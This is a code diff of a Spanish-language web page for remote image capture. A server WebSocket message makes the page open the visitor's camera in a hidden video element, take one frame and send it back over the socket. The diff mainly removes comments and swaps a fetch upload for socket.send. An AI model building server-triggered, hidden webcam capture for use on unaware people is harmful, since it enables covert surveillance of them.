@@ -7,48 +7,36 @@
 </head>
 <body>
     <h1>Captura de Imagen Remota</h1>
-
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        // Conectar al WebSocket
         const socket = new WebSocket('ws://localhost:80/ws/capture/');
 
-        // Manejar la conexión abierta
         socket.onopen = function(event) {
             console.log("Conectado al WebSocket:", event);
         };
 
-        // Manejar errores en la conexión
         socket.onerror = function(error) {
             console.error("Error en WebSocket:", error);
         };
 
-        // Cuando llega un mensaje de captura de imagen
         socket.onmessage = function(event) {
             const data = JSON.parse(event.data);
-            console.log("Mensaje recibido del servidor:", data); // Verifica el contenido del mensaje
-
-            // Verifica que el mensaje es para capturar imagen
-            if (data.action === "capturar_imagen") { // Cambia 'message' por 'action'
+            if (data.action === "capturar_imagen") {
                 console.log("Iniciando captura de imagen...");
                 activarCamaraYCapturarImagen();
             } else {
-                console.log("Acción no reconocida:", data.action); // Para depuración
+                console.log("Acción no reconocida:", data.action);
             }
         };
 
         function activarCamaraYCapturarImagen() {
-            // Solicitar acceso a la cámara
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     const video = document.getElementById("video");
                     video.srcObject = stream;
-
-                    // Esperar hasta que el video esté listo
                     video.onloadedmetadata = () => {
-                        // Captura un fotograma después de un pequeño delay para asegurarse de que la cámara está activa
                         setTimeout(() => {
                             capturarImagen(stream);
                         }, 500);
@@ -62,58 +50,24 @@
         function capturarImagen(stream) {
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
-
-            // Configurar el tamaño del canvas para que coincida con el video
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
-            // Dibujar el fotograma en el canvas
             const context = canvas.getContext("2d");
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convertir la imagen a base64
             const imagenCapturada = canvas.toDataURL("image/png");
 
-            // Enviar la imagen capturada al servidor
             enviarImagenAlServidor(imagenCapturada);
-
-            // Detener la transmisión de la cámara
             stream.getTracks().forEach(track => track.stop());
         }
 
         function enviarImagenAlServidor(imagen) {
-            fetch("/guardar_imagen/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "X-CSRFToken": getCookie('csrftoken') // Si estás en Django, incluye el token CSRF
-                },
-                body: JSON.stringify({ imagen })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Imagen enviada correctamente al servidor");
-                } else {
-                    console.error("Error al enviar la imagen:", response.statusText);
-                }
-            })
-            .catch(error => console.error("Error en la petición:", error));
-        }
-
-        // Función para obtener el CSRF token en Django (si es necesario)
-        function getCookie(name) {
-            let cookieValue = null;
-            if (document.cookie && document.cookie !== '') {
-                const cookies = document.cookie.split(';');
-                for (let i = 0; i < cookies.length; i++) {
-                    const cookie = cookies[i].trim();
-                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
-                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
-                        break;
-                    }
-                }
-            }
-            return cookieValue;
+            const message = JSON.stringify({
+                action: 'save_image',
+                image: imagen
+            });
+            socket.send(message);
+            console.log("Imagen enviada al servidor a través de WebSocket");
         }
     </script>
 </body>
